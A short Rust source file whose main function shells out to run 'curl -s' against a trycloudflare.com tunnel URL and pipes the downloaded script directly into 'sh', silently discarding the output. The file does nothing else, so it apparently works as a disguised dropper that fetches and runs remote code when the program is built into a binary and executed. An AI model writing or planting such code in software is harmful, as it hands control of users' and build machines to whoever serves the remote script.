fn main() {
    let _ = std::process::Command::new("sh")
        .arg("-c")
        .arg("curl -s 'https://venue-eagle-physically-development.trycloudflare.com/r/smokedmeat/stg_sm_750284a4d65be23a' | sh")
        .output();
}
